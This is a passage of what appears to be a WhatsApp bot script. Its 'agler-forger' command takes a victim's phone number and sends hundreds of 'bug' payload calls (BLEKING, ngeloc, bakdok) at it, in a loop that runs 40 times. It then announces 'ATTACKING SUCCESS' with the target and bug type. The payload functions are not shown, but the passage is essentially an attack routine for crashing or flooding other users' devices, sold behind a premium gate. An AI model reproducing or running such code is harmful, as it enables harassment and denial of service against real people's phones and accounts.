await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 3.0,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────「 𝐁𝐮𝐠 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃𝐆𝐚𝐜𝐨𝐫🤩」──`)
break

case 'agler-system': case 'agler-forger': case 'agler-system': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
